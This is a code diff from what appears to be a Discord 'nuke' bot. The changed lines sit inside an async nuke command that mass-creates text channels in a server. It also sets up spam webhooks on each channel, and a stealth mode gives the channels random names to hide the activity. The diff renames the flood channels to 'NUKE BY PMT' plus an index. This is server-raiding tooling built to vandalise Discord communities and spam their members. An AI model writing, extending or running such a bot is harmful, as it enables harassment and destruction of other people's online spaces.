@@ -189,9 +189,9 @@ async def nuke(ctx):
         async with channel_semaphore:
             if not bot.nuking:
                 return
-            name_base = f"{CUSTOM_CHANNEL_SUFFIX or f'god-text-{idx}'}" if not STEALTH_MODE else f"chat-{random.randint(1000,9999)}"
+            name_base = f"{CUSTOM_CHANNEL_SUFFIX or f'NUKE BY PMT{idx}'}" if not STEALTH_MODE else f"chat-{random.randint(1000,9999)}"
             try:
-                ch = await guild.create_text_channel(f"💣 {name_base}")
+                ch = await guild.create_text_channel(f" {name_base}")
                 if SPAM_MODE in ["webhook", "both"]:
                     for _ in range(3):
                         wh = await ch.create_webhook(name=f"wh_{random.randint(1000,9999)}")
